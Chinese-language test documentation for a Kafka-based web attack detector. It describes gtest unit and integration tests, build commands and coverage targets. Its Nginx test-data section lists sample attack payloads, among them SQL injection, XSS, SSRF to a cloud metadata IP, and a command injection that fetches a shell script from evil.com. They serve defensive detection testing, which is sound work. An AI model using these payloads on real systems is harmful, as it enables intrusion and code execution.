# WGE-Kafka Detector — 测试文档

## 1. 测试框架和结构

### 测试框架

项目使用 **Google Test (gtest)** 作为测试框架。所有测试文件位于 `test/` 目录下，分为两类：

```
test/
├── unit/                          # 单元测试（8 个文件）
│   ├── test_json_mapper.cc        # JsonMapper 测试
│   ├── test_regex_mapper.cc       # RegexMapper 测试
│   ├── test_field_applier.cc      # FieldApplier 测试
│   ├── test_extractor_adapter.cc  # HttpExtractorAdapter 测试
│   ├── test_alert_builder.cc      # AlertBuilder 测试
│   ├── test_offset_manager.cc     # Offset 管理逻辑测试
│   ├── test_config_loader.cc      # ConfigLoader 测试
│   └── test_worker_pool.cc        # WgeWorkerPool 测试
└── integration/                   # 集成测试（5 个文件）
    ├── test_nginx_injection.cc        # Nginx 日志注入测试
    ├── test_offset_state_machine.cc    # Offset 状态机测试
    ├── test_wal_roundtrip.cc           # WAL 往返测试
    ├── test_concurrent_worker.cc       # 并发压力测试
    └── test_e2e_pipeline.cc            # 端到端管道测试
```

### 测试构建

单元测试通过 CMake 目标 `wge_detector_test` 构建，链接 `wge_kafka_detector_core` 静态库和 `GTest::gtest_main`。集成测试需要手动启用：

```cmake
option(WGE_DETECTOR_ENABLE_TESTS "Build unit tests" ON)
option(WGE_DETECTOR_ENABLE_INTEGRATION_TESTS "Build integration tests" OFF)
```

---

## 2. 单元测试覆盖范围

**共 8 个文件，121+ 测试用例**：

| 模块 | 测试文件 | 覆盖内容 | 用例数 |
|------|---------|---------|--------|
| JSON Mapper | `test_json_mapper.cc` | JSON 解析、嵌套路径、Header 提取 (Embedded/Prefix)、字段类型映射、空值/默认值、常量注入 | 18+ |
| Regex Mapper | `test_regex_mapper.cc` | 正则编译、命名捕获组提取、Grok 模式转换、时间戳解析（5 种格式）、失败路径 | 16+ |
| Field Applier | `test_field_applier.cc` | String/Int32/Int64/Bytes/Bool/Header 六种类型赋值、类型转换错误、必填字段缺失 | 14+ |
| HTTP Extractor Adapter | `test_extractor_adapter.cc` | Header 索引构建、O(1) 查找、大小写不敏感、遍历顺序、responseStatusCode 缓存、responseProtocol 构造 | 12+ |
| Alert Builder | `test_alert_builder.cc` | AlertResult → WgeAlertEvent 转换、UUID v7 生成、字段合并、空 event_id 防御、多规则匹配聚合 | 10+ |
| Offset Manager | `test_offset_manager.cc` | 多分区追踪、成功/失败标记、批量提交、崩溃恢复、事务回滚、Exactly-once 语义、重试计数 | 15+ |
| Config Loader | `test_config_loader.cc` | YAML 解析、环境变量替换 (`${VAR}` / `${VAR:-default}`)、必填字段验证、默认值回退、配置重载合并 | 20+ |
| Worker Pool | `test_worker_pool.cc` | 线程创建/停止、有界队列、背压阻塞、协作式超时、队列排空、CAS 幂等停止、任务分发正确性 | 16+ |

---

## 3. 集成测试覆盖范围

**共 5 个文件，54 个测试用例**：

### test_nginx_injection.cc — Nginx 日志注入测试（12 用例）

| 测试用例 | 说明 |
|---------|------|
| `NginxNormalTrafficParsing` | 解析全部 20 条正常 Nginx combined log |
| `NginxAttackPayloadPreservation` | 15 条攻击 payload 原始字符完整保留（无转义丢失） |
| `NginxMixedTrafficBatch` | 35 条混合日志（正常+攻击）批量处理 |
| `NginxTimestampFormat` | Nginx 日期格式 `02/Jan/2006:15:04:05 -0700` 正确转为 epoch ms |
| `NginxSpecialCharacters` | 特殊字符（Unicode、NULL 字节、百分号编码）正确处理 |
| `NginxRequestVersionStripping` | `HTTP/1.1` → `1.1` strip 逻辑 |
| `NginxUserAgentExtraction` | User-Agent 作为 Header 正确提取 |
| `NginxRefererExtraction` | Referer 字段正确提取 |
| `NginxStatusCodesMapping` | 各 HTTP 状态码 (200/301/302/403/404/500/502) 正确转为 int32 |
| `NginxLargeBodySize` | 大 body_bytes_sent 值正确处理 |
| `NginxEmptyFields` | 空字段（如 `"-"` remote_user、空 referer）正确填写默认值 |
| `NginxHttp2Requests` | HTTP/2.0 日志正确解析 |

### test_offset_state_machine.cc — Offset 状态机测试（11 用例）

测试状态转换路径：

| 测试用例 | 状态转换 |
|---------|---------|
| `SimpleConsumeCommit` | INIT → PENDING → SUCCESS → COMMITTED |
| `ConsumeFailRetrySuccess` | INIT → PENDING → FAILED → PENDING → SUCCESS → COMMITTED |
| `BatchConsumePartialFail` | 批量消费，部分 SUCCESS + 部分 FAILED，只提交连续成功部分 |
| `TransactionRollback` | 事务回滚后 offset 回到 committed 点 |
| `MultiPartitionIndependent` | 多分区 offset 独立追踪 |
| `ExactlyOnceGuarantee` | 回滚后重消费 → 重复 offset 被去重 |
| `CommitIdempotent` | 重复 commit() 不推进已提交 offset |
| `RestoreFromCommitted` | 从 committed offset 恢复（模拟崩溃重启） |
| `OutOfOrderOffsets` | 乱序 offset 正确处理 |
| `HighWatermarkBoundary` | offset 不超过 high watermark |
| `ZeroOffsetHandling` | offset=0 边界情况 |

### test_wal_roundtrip.cc — WAL 往返测试（8 用例）

| 测试用例 | 说明 |
|---------|------|
| `WriteAndReadSingleAlert` | 写入 1 条告警，读取验证 JSON 内容一致 |
| `WriteAndReadMultipleAlerts` | 写入 10 条告警，验证顺序和数量 |
| `WalFileRotation` | 超过小时边界时文件正确轮转（旧文件保留，新文件创建） |
| `PartialRelayRecovery` | 模拟部分补发失败，剩余告警正确保留在文件中 |
| `FsyncVerification` | 写入后立即可从文件中读取 |
| `Base64EncodeDecodeRoundtrip` | Writer base64 编码 → Relay base64 解码的往返 |
| `ConcurrentWriteRead` | 多线程并发写入 + 读取，验证数据一致性 |
| `CorruptedWalRecovery` | 损坏的 WAL 行被跳过，不崩溃 |

### test_concurrent_worker.cc — 并发压力测试（10 用例）

| 测试用例 | 说明 |
|---------|------|
| `ConcurrentSubmitBatch` | 多线程同时 submitBatch，验证不丢事件 |
| `QueueBackpressure` | 队列满时 submit 正确阻塞，有空间后恢复 |
| `WorkerGracefulShutdown` | stop() 后所有 in-flight 任务完成 |
| `TaskTimeout` | 超时任务被跳过，其他任务正常完成 |
| `WorkerPoolStress` | 8 线程 × 1000 事件，验证吞吐和正确性 |
| `AlertProducerBackpressure` | Alert 队列满时 Worker 正确阻塞 |
| `DrainAllPendingOnStop` | 停止时排空队列中所有 pending 任务 |
| `CASStopIdempotent` | 多次调用 stop() 只执行一次 |
| `AtomicMetricsConsistency` | 多线程更新 metrics 计数器，最终值正确 |
| `ThreadSafetyNoDataRace` | 多次运行检测数据竞争（配合 TSan） |

### test_e2e_pipeline.cc — 端到端管道测试（11 用例）

| 测试用例 | 说明 |
|---------|------|
| `NginxAccessLogToAlert` | Nginx combined log → RegexMapper → HttpAccessEvent 全字段验证 |
| `JsonApiLogToAlert` | JSON API log → JsonMapper → 嵌套字段 + Headers 验证 |
| `ProtobufDirectPassthrough` | Protobuf 格式直接反序列化 → 字段验证 |
| `MalformedInputToDLQ` | 非法输入 → 正确路由到 DLQ |
| `MissingRequiredFields` | 必填字段缺失 → Pipeline 返回错误 |
| `LargePayloadHandling` | 大 body（接近 limit）的 payload 处理 |
| `BatchProcessing` | 批量 100 条日志一次性处理 |
| `TimestampParsingFormats` | ISO8601 / Nginx / Simple / epoch-s / epoch-ms 共 5 种格式全部正确解析 |
| `Base64BodyDecoding` | Base64 编码的 body 正确解码 |
| `HeaderExtractionEmbedded` | Embedded 模式 header 提取 |
| `HeaderExtractionPrefix` | Prefix 模式 header 提取 |

---

## 4. 如何运行单元测试

### 构建并运行所有单元测试

```bash
# 配置（确保 GTest 已安装且测试已启用）
cmake -B build -DCMAKE_BUILD_TYPE=Debug \
    -DWGE_DETECTOR_ENABLE_TESTS=ON \
    -DCMAKE_TOOLCHAIN_FILE="$VCPKG_ROOT/scripts/buildsystems/vcpkg.cmake"

# 构建
cmake --build build -j$(nproc)

# 运行所有测试
cd build
ctest --output-on-failure

# 或直接运行测试二进制
./build/wge_detector_test
```

### 运行特定测试套件

```bash
# 使用 ctest 过滤
ctest -R "JsonMapper" --output-on-failure

# 使用 gtest_filter（直接运行测试二进制）
./build/wge_detector_test --gtest_filter="*JsonMapper*"
./build/wge_detector_test --gtest_filter="*ConfigLoader*"
./build/wge_detector_test --gtest_filter="*WorkerPool*"

# 运行多个过滤
./build/wge_detector_test --gtest_filter="*Mapper*:*Applier*"
```

### 获取详细输出

```bash
# 列出所有测试用例名
./build/wge_detector_test --gtest_list_tests

# 显示成功测试的详细信息（默认只显示失败）
./build/wge_detector_test --gtest_print_time=1

# 重复运行（检测 flaky 测试）
./build/wge_detector_test --gtest_repeat=10 --gtest_break_on_failure
```

### 使用 Sanitizer

Debug 构建自动启用 AddressSanitizer 和 UndefinedBehaviorSanitizer：

```bash
cmake -B build -DCMAKE_BUILD_TYPE=Debug ...
# ASan/UBSan 会在内存错误时自动报告
./build/wge_detector_test

# 加上 ThreadSanitizer（需手动添加编译选项）
cmake -B build -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_CXX_FLAGS="-fsanitize=thread" ...
```

---

## 5. 如何运行集成测试

### 构建集成测试

```bash
cmake -B build -DCMAKE_BUILD_TYPE=Debug \
    -DWGE_DETECTOR_ENABLE_TESTS=ON \
    -DWGE_DETECTOR_ENABLE_INTEGRATION_TESTS=ON \
    -DCMAKE_TOOLCHAIN_FILE="$VCPKG_ROOT/scripts/buildsystems/vcpkg.cmake"

cmake --build build -j$(nproc)
```

### 运行集成测试

集成测试**设计为自包含**，不依赖外部 Kafka/WGE 服务：

| 测试文件 | 依赖条件 |
|---------|---------|
| `test_nginx_injection` | 无外部依赖，数据内嵌在测试代码中 |
| `test_offset_state_machine` | 无外部依赖，纯内存状态机 |
| `test_wal_roundtrip` | 需要临时目录 `/tmp/`（测试自动创建和清理） |
| `test_concurrent_worker` | 无外部依赖，模拟 detect() |
| `test_e2e_pipeline` | 无外部依赖，mock 数据 |

```bash
# 运行所有集成测试
./build/test_nginx_injection
./build/test_offset_state_machine
./build/test_wal_roundtrip
./build/test_concurrent_worker
./build/test_e2e_pipeline

# 或使用 ctest（需在 CMake 中注册集成测试目标）
```

---

## 6. Nginx 日志注入测试数据说明

### 正常流量（20 条）

覆盖典型 Web 应用访问场景：

| # | 描述 | 方法 | URI | 状态码 | 特点 |
|---|------|------|-----|--------|------|
| 1 | GET 首页 | GET | `/index.html` | 200 | 标准浏览器 User-Agent |
| 2 | POST 登录 | POST | `/login` | 302 | 带 Referer |
| 3 | GET 带查询字符串 | GET | `/search?q=nginx&page=1&sort=recent` | 200 | curl User-Agent |
| 4 | RESTful API | GET | `/api/v1/users/12345` | 200 | python-requests UA |
| 5 | 静态 CSS | GET | `/static/css/main.3f2a1b8.css` | 200 | 带文件哈希 |
| 6 | 404 | GET | `/nonexistent` | 404 | 错误页面 |
| 7 | POST API | POST | `/api/v1/orders` | 201 | JSON Content-Type |
| 8 | WebSocket 升级 | GET | `/ws/chat` | 101 | Upgrade 头 |
| 9 | PUT 更新 | PUT | `/api/v1/users/12345` | 200 | RESTful |
| 10 | DELETE | DELETE | `/api/v1/users/12345` | 204 | 无 body |
| 11 | PATCH | PATCH | `/api/v1/users/12345` | 200 | 部分更新 |
| 12 | 图片资源 | GET | `/images/logo.png` | 200 | 大 body_bytes_sent |
| 13 | 500 错误 | GET | `/api/v1/broken` | 500 | 服务端错误 |
| 14 | 502 | GET | `/api/v1/proxy` | 502 | 网关错误 |
| 15 | 301 重定向 | GET | `/old-path` | 301 | 永久重定向 |
| 16 | IPv6 客户端 | GET | `/` | 200 | `::1` 地址 |
| 17 | 带身份用户 | GET | `/admin` | 403 | remote_user: admin |
| 18 | HEAD 请求 | HEAD | `/health` | 200 | 仅头信息 |
| 19 | OPTIONS | OPTIONS | `/api/v1/users` | 204 | CORS 预检 |
| 20 | HTTP/2.0 | GET | `/` | 200 | HTTP/2 协议 |

### 攻击流量（15 条）

| # | 攻击类型 | Payload | 关键验证点 |
|---|---------|---------|-----------|
| 1 | SQL 注入（Union） | `?id=1 UNION SELECT * FROM users` | 保留 SQL 关键字和空格 |
| 2 | XSS 反射 | `?q=<script>alert(1)</script>` | 保留尖括号和 JavaScript |
| 3 | 路径遍历 | `/../../../etc/passwd` | 保留 `../` 序列 |
| 4 | 命令注入 | `; wget http://evil.com/shell.sh` | 保留分号和管道字符 |
| 5 | SSTI | `{{7*7}}` | 保留模板语法花括号 |
| 6 | XXE | `<?xml version="1.0"?><!DOCTYPE foo [...]>` | 保留 XML 声明和 DOCTYPE |
| 7 | LDAP 注入 | `*)(uid=*))(|(uid=*` | 保留括号和通配符 |
| 8 | CRLF 注入 | `%0d%0aSet-Cookie: evil=1` | 保留 URL 编码换行符 |
| 9 | NoSQL 注入 | `{"$gt": ""}` | 保留 MongoDB 操作符 |
| 10 | SSRF | `?url=http://169.254.169.254/latest/meta-data/` | 保留 AWS 元数据 IP |
| 11 | 反序列化 | Java serialized bytes（base64 编码） | 保留二进制 base64 |
| 12 | 文件包含 | `?file=php://filter/convert.base64-encode/resource=config` | 保留 PHP 封装协议 |
| 13 | 缓冲区溢出 | 4096 个 'A' 字符 | 保留超长字符串 |
| 14 | SQL 盲注 | `?id=1 AND 1=1 --` | 保留 SQL 注释符 |
| 15 | Unicode 绕过 | `?q=%u003Cscript%u003E` | 保留 Unicode 编码 |

---

## 7. WAL 往返测试场景

WAL 测试使用 **临时目录** `/tmp/wge_integration_test_XXXXXX`，每个测试用例独立创建和清理。

### 测试场景矩阵

| 场景 | 操作 | 验证 |
|------|------|------|
| 单告警写入即读 | 写 1 条 → 立即读 | JSON 内容完全一致 |
| 多告警顺序写入 | 写 10 条 → 依次读 | 数量和顺序正确 |
| 文件轮转 | 写告警 → 修改系统时钟 → 再写 | 新文件被创建，旧文件保留历史数据 |
| 部分补发失败 | 写 5 条 → Relay 只成功补发 3 条 | 剩余 2 条保留在文件中 |
| Fsync 验证 | 写告警 → 不调用 flush → 读文件 | 数据立即可见 |
| Base64 往返 | 二进制 body → base64 编码写入 → 解码读取 | 解码后与原始数据一致 |
| 并发写读 | 2 写线程 + 1 读线程并发 | 所有写入的数据都能被读到 |
| 损坏恢复 | 在 WAL 文件中插入非法 JSON 行 | 损坏行被跳过，其他行正常读取 |

### WAL 文件格式

```
/var/lib/wge/wal/alert-20260520-14.log
/var/lib/wge/wal/alert-20260520-15.log
```

每行一条告警的 JSON（单行，无换行，append-only）：

```json
{"alert_id":"018f...","timestamp_ms":1700000000000,"event_id":"evt-001",...}
{"alert_id":"018f...","timestamp_ms":1700000001000,"event_id":"evt-002",...}
```

---

## 8. 并发压力测试说明

`test_concurrent_worker.cc` 不依赖真实 WGE Engine 和 Kafka，使用**模拟检测逻辑**替代 `detect()`，专注于验证并发正确性。

### 10 个测试场景

| # | 测试 | 并发模型 | 验证点 |
|---|------|---------|--------|
| 1 | ConcurrentSubmitBatch | 4 个 submit 线程 + 4 个 worker | 所有事件都被处理，无丢失 |
| 2 | QueueBackpressure | 队列容量=10，提交 100 个事件 | submit 正确阻塞，空间释放后恢复 |
| 3 | WorkerGracefulShutdown | 提交后立即 stop() | 所有 in-flight 任务完成后再退出 |
| 4 | TaskTimeout | worker 设置 50ms 超时，提交长时间任务 | 超时事件被跳过，短任务正常完成 |
| 5 | WorkerPoolStress | 8 线程 × 1000 事件 | 高吞吐压力下无数据竞争 |
| 6 | AlertProducerBackpressure | 内部队列容量=10 | 队列满时 worker.sendAlert 阻塞 |
| 7 | DrainAllPendingOnStop | 队列中有 50 个 pending 事件 → stop() | 全部 50 个被排空处理 |
| 8 | CASStopIdempotent | 3 个线程同时调用 stop() | 只有第一个执行停止逻辑 |
| 9 | AtomicMetricsConsistency | 8 线程各自更新 events_consumed 1000 次 | 最终值为 8000 |
| 10 | ThreadSafetyNoDataRace | 重复运行 100 次 | 配合 TSan 无警告 |

### 模拟 detect() 逻辑

```cpp
// 测试中使用假 detect 函数，不调用真实 WGE 引擎
auto fake_detect = [](const HttpAccessEvent& event) -> AlertResult {
    AlertResult result;
    result.event_id = event.event_id();
    result.timestamp_ms = now();

    // 模拟检测延迟（1-5ms）
    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 5 + 1));

    // 模拟匹配率约 5%
    if (rand() % 100 < 5) {
        MatchedRuleInfo rule;
        rule.rule_id = 1001;
        rule.severity = 3;
        result.matched_rules.push_back(rule);
    }
    return result;
};
```

---

## 9. Offset 状态机测试状态转换图

### 状态定义

```
enum class OffsetStatus : uint8_t {
    Init,       // 初始状态
    Pending,    // 已消费，等待处理
    Success,    // 处理成功
    Failed,     // 处理失败
    Partial,    // 批量中的部分成功
    Committed,  // 已提交到 Kafka
};
```

### 状态转换图

```
                    consume(n)
       [INIT] ──────────────────▶ [PENDING]
                                       │
                        ┌──────────────┼──────────────┐
                        │              │              │
                   markSuccess(n)  markFailure(n)  markPartial(n)
                        │              │              │
                        ▼              ▼              ▼
                   [SUCCESS]      [FAILED]       [PARTIAL]
                        │              │              │
                        │          retry()       retry()
                        │         ┌───┘              │
                        │         ▼                  │
                        │      [PENDING] ◀───────────┘
                        │
                   commit()
                        │
                        ▼
                   [COMMITTED]
                        │
                        ▼
                     (CLEAN — 可从追踪中移除)
```

### 转换规则

| 当前状态 | 触发操作 | 新状态 | 说明 |
|---------|---------|--------|------|
| INIT | `consume(n)` | PENDING | 消费一个消息 |
| PENDING | `markSuccess(n)` | SUCCESS | 检测完成，无匹配或正常完成 |
| PENDING | `markFailure(n)` | FAILED | 检测超时或 WGE 内部错误 |
| PENDING | `markPartial(n)` | PARTIAL | 批量中的部分成功 |
| FAILED | `retry(n)` | PENDING | 重试该 offset |
| PARTIAL | `retry(n)` | PENDING | 重试未成功的部分 |
| SUCCESS/PARTIAL | `commit()` | COMMITTED | 提交 offset 到 Kafka |
| COMMITTED | — | (CLEAN) | 终端状态，可安全移除 |

### 回滚

```
rollback() 将所有 PENDING/SUCCESS/FAILED/PARTIAL
恢复为 INIT，仅 COMMITTED 的 offset 被保留
```

### 崩溃恢复

```
restore() 将 current_offset 重置为 committed_offset
所有 PENDING/SUCCESS/FAILED 状态记录被清除
```

---

## 10. 覆盖率目标和当前状态

### 目标

| 指标 | 目标 | 说明 |
|------|------|------|
| 行覆盖率 | ≥ 85% | 核心逻辑路径全覆盖 |
| 分支覆盖率 | ≥ 80% | 错误路径和边界条件 |
| 函数覆盖率 | ≥ 90% | 所有公开 API |

### 当前状态（估算）

| 模块 | 行覆盖 | 说明 |
|------|--------|------|
| mapper/ | ~90% | JSON/Regex 映射器、字段应用器有完整单元测试 |
| config/ | ~85% | YAML 解析、环境变量替换、验证全部覆盖 |
| detector/ | ~80% | WorkerPool 和 AlertBuilder 有完整测试；detect() 部分依赖 WGE |
| kafka/ | ~75% | Consumer/Producer/DLQ 封装，部分路径依赖真实 Kafka |
| wal/ | ~85% | Writer 和 Relay 有往返集成测试 |
| metrics/ | ~90% | 纯 atomic 操作，Prometheus 输出格式测试 |

### 生成覆盖率报告

```bash
# 使用 gcov/lcov
cmake -B build -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_CXX_FLAGS="--coverage" \
    -DCMAKE_EXE_LINKER_FLAGS="--coverage"
cmake --build build -j$(nproc)
./build/wge_detector_test

# 生成 HTML 报告
lcov --capture --directory build --output-file coverage.info
lcov --remove coverage.info '/usr/*' '*/test/*' '*/_deps/*' --output-file coverage_filtered.info
genhtml coverage_filtered.info --output-directory coverage_html
```

---

## 11. 添加新测试的指南

### 添加单元测试

1. **创建测试文件** `test/unit/test_new_component.cc`：

```cpp
/**
 * @file test_new_component.cc
 * @brief NewComponent 单元测试
 */

#include <gtest/gtest.h>

#include "new_component.h"

using namespace wge::kafka;

// ============================================================================
// 测试夹具（如需共享初始化逻辑）
// ============================================================================

class NewComponentTest : public ::testing::Test {
protected:
    void SetUp() override {
        // 每个测试前运行
    }

    void TearDown() override {
        // 每个测试后运行
    }
};

// ============================================================================
// 测试用例
// ============================================================================

TEST_F(NewComponentTest, BasicFunctionality) {
    // Arrange
    // Act
    // Assert
    EXPECT_EQ(expected, actual);
}

TEST_F(NewComponentTest, ErrorHandling) {
    // 测试错误路径
    auto result = someFunction(invalid_input);
    EXPECT_FALSE(result.has_value());
    EXPECT_TRUE(result.error().contains("expected error message"));
}

TEST(NewComponentFreeTest, StandaloneLogic) {
    // 不需要夹具的独立测试
    EXPECT_TRUE(simplePureFunction());
}
```

2. **在 `CMakeLists.txt` 的 `TEST_SOURCES` 中添加**：

```cmake
set(TEST_SOURCES
    test/unit/test_json_mapper.cc
    test/unit/test_regex_mapper.cc
    # ... 已有测试 ...
    test/unit/test_new_component.cc   # 新增
)
```

3. **遵循 AAA 模式**：Arrange（准备）→ Act（执行）→ Assert（验证）

4. **命名约定**：`TEST(TestSuiteName, TestName)` 中 TestName 使用描述性驼峰命名。

### 添加集成测试

1. 创建 `test/integration/test_new_integration.cc`
2. 使用 `SetUp()`/`TearDown()` 管理临时资源
3. 确保**自包含**，不依赖外部服务
4. 对于 Kafka/WGE 依赖，使用 mock/fake 实现

### 测试编写检查清单

- [ ] 正常路径（happy path）有测试
- [ ] 错误路径有测试（无效输入、边界值）
- [ ] 每个 `if` 分支有测试覆盖
- [ ] 每个 `switch` case 有测试覆盖
- [ ] 空输入、空容器有测试
- [ ] 并发测试有 TSan 安全保证
- [ ] 测试命名清晰描述"测什么"而非"怎么测"
- [ ] 使用 `EXPECT_*` 而非 `ASSERT_*`（除非后续断言依赖前一个结果）
